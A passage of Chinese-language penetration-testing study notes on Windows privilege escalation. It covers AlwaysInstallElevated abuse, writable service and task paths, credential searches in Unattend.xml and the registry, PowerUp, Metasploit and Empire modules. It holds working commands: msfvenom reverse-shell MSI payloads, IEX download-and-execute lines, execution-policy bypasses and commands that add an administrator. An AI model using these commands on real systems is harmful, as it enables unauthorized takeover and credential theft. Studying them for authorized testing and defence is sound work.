<p>WindowsInstaller的相关知识点：WindowsInstaller是Windows操作系统的组件之一，专门用来管理和配置软件服务。WindowsInstaller除了是一个安装程序，还用于管理软件的安装、管理软件组件的添加和删除、监视文件的还原、通过回滚进行灾难恢复等。Windows Installer分为客户端安装服务(Msiexec.exe)和MSI文件两部分，它们是一起工作的。<mark>Windows Installer通过Msiexec.exe安装MSI文件包含的程序。MSI文件是Windows Installer的数据包，它实际上是一个数据库，包含安装和卸载软件时需要使用的大量指令和数据。Msiexec.exe用于安装MSI文件，一般在运行Microsoft Update安装更新或者安装一些软件的时候使用，占用内存较多。简单地说，双击MSI文件就会运行Msiexec.exe</mark>。</p>
<p>产生该漏洞的原因是由于用户在策略编辑器中开启了 Windows Installer 特权安装功能，有两种开启方法，如下</p>
<ul>
<li>
<p>方法1，图形化：</p>
<ol>
<li>Win + R在“运行”设置框中输入“gpedit.msc”，打开组策略编辑器。</li>
</ol>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109142408469.png" alt="image-20231109142408469"></p>
<ol start="2">
<li>按照以下路径启用即可</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">组策略——计算机配置——管理模板——Windows组件——Windows Installer——永远以高特权进行安装：选择启用。
组策略——用户配置——管理模板——Windows组件——Windows Installer——永远以高特权进行安装：选择启用。

#设置完毕后，会在注册表的以下两个位置自动创建键值1
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>方法2，命令行</p>
<pre class="line-numbers language-none"><code class="language-none">#也可以直接使用命令行开启这两项注册表。
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated &#x2F;t REG_DWORD &#x2F;d 1
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated &#x2F;t REG_DWORD &#x2F;d 1
#然后使用 reg 查看这两项的键值，0x1 表示处于开启状态。
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109144231491.png" alt="image-20231109144231491"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109144247688.png" alt="image-20231109144247688"></p>
</li>
</ul>
<p>下面对这种危险配置进行利用：</p>
<h4 id="使用PowerUp进行利用">使用PowerUp进行利用</h4>
<p>可以使用 PowerUp.ps1 脚本里的<code>Get-RegistryAlwaysInstallElevated 模块</code>来检查相关注册表是否被设置</p>
<pre class="line-numbers language-none"><code class="language-none">#在 PowerShell 中导入并执行脚本
Import-Module .\PowerUp.ps1
Get-RegistryAlwaysInstallElevated<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用 -exec bypass 进行绕过</p>
<pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Get-RegistryAlwaysInstallElevated&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者使用下载执行的方式</p>
<pre class="line-numbers language-none"><code class="language-none">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.3.61:8000&#x2F;PowerUp.ps1&#39;); Get-RegistryAlwaysInstallElevated&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109174729033.png" alt="image-20231109174729033"></p>
<p>返回为 True，表示相关注册表被设置了，也就意味着 MSI 文件是以 SYSTEM 权限运行的</p>
<p>运行 PowerUp 的 Write-UserAddMSI 模块</p>
<pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Write-UserAddMSI&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><mark>运行完后，会在当前目录下生成一个 UserAdd.msi 程序，此时以普通用户权限执行该 MSI 程序就会创建一个管理员账户</mark></p>
<p>直接双击或者命令行启动该 MSI 程序。</p>
<pre class="line-numbers language-none"><code class="language-none">msiexec &#x2F;q &#x2F;i UserAdd.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>msiexec 参数介绍：</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;quiet：安装过程中禁止向用户发送消息
&#x2F;qn：不使用GUI
&#x2F;q：隐藏安装界面
&#x2F;i：安装程序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109181230658.png" alt="image-20231109181230658"></p>
<h4 id="使用MSF进行利用">使用MSF进行利用</h4>
<p>MSF 中可以使用 <code>exploit/windows/local/always_install_elevated 模块</code>，直接获取 SYSTEM 权限</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;always_install_elevated
set session 1
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109213344658.png" alt="image-20231109213344658"></p>
<p>除了上面的操作外，还可以使用 msfvenom 生成 MSI 文件，从而以 SYSTEM 权限执行任意命令。</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;exec CMD&#x3D;&lt;命令&gt; -f msi &gt; calc.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者以 SYSTEM 权限上线</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.214.65 lport&#x3D;4444 –f msi -o shell.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="使用MSI-Wrapper进行利用">使用MSI Wrapper进行利用</h4>
<p>MSI Wrapper是一个操作简单直观的MSI安装包生成工具，可以使用该工具制作一个包含木马的MSI安装包。</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://www.exemsi.com/download/">https://www.exemsi.com/download/</a></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109215100747.png" alt="image-20231109215100747"></p>
<p>设置运行时提升权限</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109215122347.png" alt="image-20231109215122347"></p>
<p>之后 Application Id 随便选一个，其他操作默认就行，然后将 MSI 文件拷贝到目标主机上</p>
<p>开启攻击主机的监听，双击 MSI 文件之后就可以看到回连的会话已经是 SYSTEM 权限了。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109215140474.png" alt="image-20231109215140474"></p>
<h3 id="计划任务利用">计划任务利用</h3>
<p>使用以下命令可以看到当前计算机的计划任务</p>
<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query &#x2F;fo list &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109222341623.png" alt="image-20231109222341623"></p>
<h4 id="使用AccessChk检查目录权限">使用AccessChk检查目录权限</h4>
<p><mark>AccessChk 是微软官方提供的一款工具，因此往往不会引起杀软的告警</mark>，AccessChk 可用来进行一些系统或程序的高级查询、管理和故障排除工作。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109222316196.png" alt="image-20231109222316196"></p>
<p>AccessChk 下载地址：<a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/AccessChk.zip">https://download.sysinternals.com/files/AccessChk.zip</a></p>
<p>在第一次使用时，会弹出许可协议对话框，可以使用 /accepteula 进行关闭</p>
<pre class="line-numbers language-none"><code class="language-none">.\accesschk.exe &#x2F;accepteula<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>执行以下命令，查看指定目录的权限配置情况：</p>
<pre class="line-numbers language-none"><code class="language-none">.\accesschk.exe -dqv &quot;C:\Program Files&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109221141948.png" alt="image-20231109221141948"></p>
<p>如果攻击者以高权限运行的任务所在目录有写权限，就可以使用恶意程序覆盖原来的程序，这样计划任务下次运行时，就会以高权限运行恶意程序。</p>
<pre class="line-numbers language-none"><code class="language-none">#列出每个驱动器下所有权限配置不当的文件夹
.\accesschk.exe -uwdqs Users c:\ 
.\accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109221245935.png" alt="image-20231109221245935"></p>
<pre class="line-numbers language-none"><code class="language-none">#列出每个驱动器下所有权限配置不当的文件
.\accesschk.exe -uwqs Users c:\*.*
.\accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109222501201.png" alt="image-20231109222501201"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109221343035.png" alt="image-20231109221343035"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109221558566.png" alt="image-20231109221558566"></p>
<h4 id="使用icacls检查目录权限">使用icacls检查目录权限</h4>
<p><mark>icacls 是 Windows 操作系统自带的命令行工具，从 Windows Vista 和 Windows Server 2008 开始引入</mark>。它是一种用于管理和修改文件、文件夹和对象权限的高级访问控制工具</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109222605576.png" alt="image-20231109222605576"></p>
<pre class="line-numbers language-none"><code class="language-none">#icacls命令的常用参数
&#x2F;grant：授予指定用户或组的权限。
&#x2F;deny：拒绝指定用户或组的权限。
&#x2F;remove：移除指定用户或组的权限。
&#x2F;inheritance：控制继承设置。
&#x2F;reset：重置对象的权限为默认设置。
&#x2F;setintegritylevel：设置对象的完整性级别。
&#x2F;save：将对象的权限保存到文件。
&#x2F;restore：从文件中恢复对象的权限。
&#x2F;verify：验证对象的权限是否正确。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">#检查目录权限
icacls &quot;目录&quot;
#icacls &quot;C:\Program Files&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109222840327.png" alt="image-20231109222840327"></p>
<pre class="line-numbers language-none"><code class="language-none">#icacls权限标识符
F - 完全访问
M - 修改访问权限
RX -读取和执行访问权限
R - 只读访问
W - 只写访问
D - 删除
RC - 读取控制（读取权限）
WDAC - 写入 DAC（更改权限）
WO - 写入所有者（获取所有权）
S - 同步
AS - 访问系统安全性
MA - 允许的最大值
GR - 泛型读取
GW - 泛型写入
GE - 泛型执行
GA - 泛型全部
RD - 读取数据&#x2F;列表目录
WD - 写入数据&#x2F;添加文件
AD - 追加数据&#x2F;添加子目录
REA - 读取扩展属性
WEA - 写入扩展属性
X - 执行&#x2F;遍历
DC - 删除子级
RA - 读取属性
WA - 写入属性
(I) - 继承。 ACE 继承自父容器。
(OI) - 对象继承。 此容器中的对象将继承此 ACE。 仅适用于目录。
(CI) - 容器继承。 此父容器中的容器将继承此 ACE。 仅适用于目录。
(IO) - 仅继承。 ACE 继承自父容器，但不适用于对象本身。 仅适用于目录。
(NP) - 不传播继承。 ACE 由容器和对象从父容器继承，但不会传播到嵌套容器。仅适用于目录。

# ACE，即访问控制项 

#在Windows操作系统中常见的用户和用户组的名称
NT SERVICE\TrustedInstaller：是Windows操作系统中的一个特殊帐户，用于安装、卸载和修改Windows系统文件和注册表项。它拥有很高的权限，可以访问系统的关键部分。
NT AUTHORITY\SYSTEM：是一个内置的本地系统帐户，它在Windows系统中具有最高级别的权限。该帐户用于操作系统的核心功能，并可以访问系统上的所有资源。
BUILTIN\Administrators：是一个内置的本地管理员组，包含具有系统管理权限的用户。该组中的用户可以执行系统范围的操作，如安装软件、更改系统设置和管理其他用户帐户等。
BUILTIN\Users：是一个内置的本地用户组，包含所有在计算机上登录的用户。该组通常具有较低的权限，并受到一些安全限制，以防止对系统造成损害。
CREATOR OWNER：是一个特殊的安全标识符（SID），在文件和文件夹的安全设置中使用。它代表文件或文件夹的创建者，并允许该创建者对其拥有完全的控制权限，而其他用户可能具有不同的权限。
Everyone：指所有用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>补充两个术语：</p>
<ul>
<li>ACL（Access Control List）</li>
</ul>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231110125229587.png" alt="image-20231110125229587"></p>
<ul>
<li>ACE（Access Control Entry），即访问控制项</li>
</ul>
<p>举个例子，“Everyone：(OI)(CD(E)”的意思是，对该文件夹，用户有读、写、删除其下文件、删除其子目录的权限。</p>
<p>还有一个和icacls相似的命令，即cacls，icacls的出现是为了代替cacls</p>
<pre class="line-numbers language-none"><code class="language-none">#cacls的使用和icacls类似
cacls &quot;C:\Program Files&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>确认目标机器中存在此漏洞后，把要上传的程序重命名并放置在存在此漏洞且可写的目录下，执行如下命令，尝试重启服务</p>
<pre class="line-numbers language-none"><code class="language-none">sc stop service_name
sc start service_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>sc命令是Windows操作系统中的一个命令行工具，用于管理和配置Windows服务。它允许你查看、创建、修改、启动、停止和删除系统中的服务。以下是一些常用的sc命令参数和用法：</p>
<pre class="line-numbers language-none"><code class="language-none">#查询服务信息
sc query &lt;servicename&gt;
#列出所有的服务及其详细信息，键入以下命令之一
sc.exe query
sc.exe query type&#x3D; service
#启动服务
sc start &lt;servicename&gt;
#停止服务
sc stop &lt;servicename&gt;
#暂停服务
sc pause &lt;servicename&gt;
#恢复服务
sc continue &lt;servicename&gt;
#创建服务
#这个命令用于创建一个新的服务，你需要指定服务的名称、可执行文件路径以及启动类型（自动、手动或禁用）。
sc create &lt;servicename&gt; [binPath&#x3D; ] start&#x3D; [auto|demand|disabled] 
#删除服务
sc delete &lt;servicename&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="配置文件信息泄露">配置文件信息泄露</h3>
<p>管理员在对内网中多台机器进行环境配置时，通常不会一台一台的配置，<mark>往往会采用脚本批量化的方式</mark>。</p>
<p>在这个过程中，可能就会有一些包含安装配置信息的文件，比如在这些文件中可能就包含了账号、密码，常见的安装配置文件路径如下：</p>
<pre class="line-numbers language-none"><code class="language-none">C:\sysprep.inf
C:\syspreg\sysprep.xml
C:\Windows\system32\sysprep.inf
C:\windows\system32\sysprep\sysprep.xml
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\Sysprep\Unattend.xml
C:\Windows\System32\Sysprep\Panther\Unattend.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>或者直接全局搜索 Unattend.xml 文件</p>
<pre class="line-numbers language-none"><code class="language-none">dir &#x2F;b &#x2F;s C:\Unattend.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231110123001059.png" alt="image-20231110123001059"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231110123023175.png" alt="image-20231110123023175"></p>
<p>也可以直接使用 MSF 的 <code>post/windows/gather/enum_unattend 模块</code></p>
<pre class="line-numbers language-none"><code class="language-none">use post&#x2F;windows&#x2F;gather&#x2F;enum_unattend
set session 1
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231110095205643.png" alt="image-20231110095205643"></p>
<p>其他的一些敏感文件查询指令</p>
<pre class="line-numbers language-none"><code class="language-none">dir C:\ &#x2F;s &#x2F;b &#x2F;c | findstr &#x2F;sr \*password\*
reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s
reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111124845846.png" alt="image-20231111124845846"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111124749298.png" alt="image-20231111124749298"></p>
<h3 id="PowerUp">PowerUp</h3>
<p>PowerUp 可以用来寻找目标中权限配置不当的服务。</p>
<p>旧版下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1</a></p>
<p>新版下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></p>
<pre class="line-numbers language-none"><code class="language-none">#在 PowerShell 中导入并执行脚本
Import-Module .\PowerUp.ps1
Invoke-AllChecks<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过</p>
<pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;&quot;
或者直接使用下载执行
powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellEmpire&#x2F;PowerTools&#x2F;master&#x2F;PowerUp&#x2F;PowerUp.ps1&#39;); Invoke-AllChecks&quot;
#powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.3.61:8000&#x2F;PowerUp.ps1&#39;); Invoke-AllChecks&quot;

#注意DownloadString()方法也可以加载本地脚本，如下就是加载位于c:\PowerUp.ps1的脚本
powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;c:\PowerUp.ps1&#39;); Invoke-AllChecks&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">
PS C:\Users\teamssix\Desktop&gt; powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;&quot;

[*] Running Invoke-AllChecks

[*] Checking if user is in a local group with administrative privileges...
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.

[*] Checking for unquoted service paths...

[*] Checking service executable and argument permissions...

ServiceName    : MongoDB
Path           : C:\Web\mongodb\bin\mongod.exe --auth --config C:\Web\mongodb\mongod.conf --s
                 ervice
ModifiableFile : C:\Web\mongodb\mongod.conf
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -ServiceName &#39;MongoDB&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>由于结果可能比较长，因此也可以将其保存到 txt 文件里，方便查看</p>
<pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks | Out-File -Encoding ASCII result.txt&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>PowerUp 会列出了可能存在问题的所有服务，并在 AbuseFunction 部分直接给出利用方式，Path 值为该服务的可执行程序的路径</p>
<p>从检查的结果可以看出 MongoDB 服务存在漏洞，利用 Install-ServiceBinary 模块，通过 PowerUp 利用该处权限配置不当添加管理员用户。</p>
<pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &#39;MongoDB&#39; -UserName test -Password Passw0rd&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix\Desktop&gt; powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &#39;MongoDB&#39; -UserName test -Password Passw0rd&#125;&quot;

ServiceName                   ServicePath                   Command                       BackupPath
-----------                   -----------                   -------                       ----------
MongoDB                       C:\Web\mongodb\bin\mongod...  net user test Passw0rd &#x2F;ad... C:\Web\mongodb\bin\mongod...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>重启系统，查看用户，发现 test 已经被添加到管理员组了</p>
<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix\Desktop&gt; net user test
用户名                 test
全名
……
本地组成员             *Administrators       *Users
全局组成员             *None
命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Metasploit-2">Metasploit</h3>
<p>在 MSF 中，先看下已上线主机的权限</p>
<pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; getuid
Server username: TEAMSSIX\dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>MSF 中对应服务权限配置不当的利用模块是<code>exploit/windows/local/service_permissions</code></p>
<p>利用步骤如下：</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;service_permissions
set payload windows&#x2F;meterpreter&#x2F;reverse_tcp
set lhost 192.168.7.1
set lport 4444
set session 1
run
#注意，exploit&#x2F;windows&#x2F;local&#x2F;service_permissions模块还有一个配置项，叫做“AGGRESSIVE”，可以利用目标机器上每一个有缺陷的服务。该配置项默认为false。表示在第一次提权成功后就会停止工作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231109104529216.png" alt="image-20231109104529216"></p>
<p>可以看到会话直接被提升到了 SYSTEM 权限。</p>
<p>service_permissions模块使用两种方法来获得System权限：如果meterpreter以管理员权限运行，该模块会尝试创建并运行一个新的服务；如果当前权限不允许创建服务，该模块会判断哪些服务的文件或者文件夹的权限有问题，并允许对其进行劫持。在创建服务或者劫持已经存在的服务时，该模块会创建一个可执行程序，其文件名和安装路径都是随机的。</p>
<h3 id="Empire-2">Empire</h3>
<p>Empire内置了PowerUp的部分模块用于系统提权，主要有Windows错误系统配置漏洞、Windows Services漏洞、AlwaysInstallElevated漏洞等8种提权方式。输入“usemodule privesc/powerup”命令，然后按“Tab”键，查看PowerUp的模块列表</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231110125958972.png" alt="image-20231110125958972"></p>
<p>下面以AllChecks模块为例，AllChecks模块用于查找系统中的漏洞。和PowerSploit下PowerUp中的Invoke-AllChecks模块一样，AlIChecks模块可用于执行脚本、检查系统漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">usemodule privesc&#x2F;powerup&#x2F;allchecks
execute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>AllChecks模块的应用对象如下：</p>
<ul>
<li>没有被引号引起来的服务的路径</li>
<li>ACL配置错误的服务(攻击者通常通过“service_ *”利用它)</li>
<li>服务的可执行文件的权限设置不当(攻击者通常通过“service_exe_ *”利用它)</li>
<li>Unattend.xml文件</li>
<li>注册表键AlwaysInstallElevated</li>
<li>如果有Autologon凭证，都会留在注册表中</li>
<li>加密的 web.config 字符串和应用程序池的密码</li>
<li>%PATH%.DLL的劫持机会(攻击者通常通过write_dllhijacker 利用它)</li>
</ul>
<h2 id="组策略首选项提权利用">组策略首选项提权利用</h2>
<p>SYSVOL是活动目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控制器之间进行复制。<mark>SYSVOL文件夹是在安装活动目录时自动创建的，主要用来存放登录脚本、组策略数据及其他域控制器需要的域信息等。SYSVOL在所有经过身份验证的城用户或者域信任用户具有读权限的活动目录的域范围内共享。整个SYSVOL目录在所有的域控制器中是自动同步和共享的，所有的域策略均存放在C:\Windows\SYSVOL\DOMAIN\Policies\目录中</mark>。</p>
<p><mark>在一般的域环境中，所有机器都是脚本化批量部署的，数据量通常很大。为了方便地对所有的机器进行操作，网络管理员往往会使用域策略进行统一的配置和管理</mark>。大多数组织在创建域环境后，会要求加入域的计算机使用域用户密码进行登录验证。为了保证本地管理员密码的安全性，这些组织的网络管理员往往会修改本地管理员密码。尽管如此，安全问题依旧存在。<mark>通过组策略统一修改的密码，虽然强度有所提高，但所有机器的本地管理员密码是相同的。攻击者获得了一台机器的本地管理员密码，就相当于获得了整个域中所有机器的本地管理员密码</mark></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231110134907595.png" alt="image-20231110134907595"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231110134918455.png" alt="image-20231110134918455"></p>
